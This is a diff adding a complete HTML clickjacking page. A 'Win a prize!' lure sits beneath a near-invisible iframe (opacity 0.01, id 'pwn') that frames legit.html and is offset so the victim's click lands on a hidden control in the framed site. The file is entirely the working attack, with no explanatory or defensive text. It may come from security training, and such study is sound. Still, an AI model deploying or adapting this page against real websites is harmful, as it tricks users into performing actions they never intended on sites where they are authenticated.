@@ -1,0 +1,44 @@
+<html>
+<head>
+<style>
+#prize {
+	width: 150px;
+	font-size: 20;
+	margin: auto;
+	background-color: orange;
+	color: white;
+	text-align: center;
+}
+
+#outerDiv {	
+	position: relative;
+	top:-23px;
+	left:270px;
+	overflow:hidden;
+	width:295px;
+	height:23px;
+	z-index:1;
+}
+
+#pwn {
+	position:absolute;
+	top:-110px;
+	left:-105px;
+	opacity: 0.01;
+	width:500px;
+	height:300px;
+	z-index:2;
+}
+</style>
+<title>Win a prize!</title>
+</head>
+<body>
+<h1>Click the button below to claim your prize</h1>
+<br/><br/>
+<div id="prize">Win Prize!</div>
+<div id="outerDiv">
+<iframe id="pwn" src="legit.html" scrolling="no"></iframe>
+</div>
+</br>
+</body>
+</html>
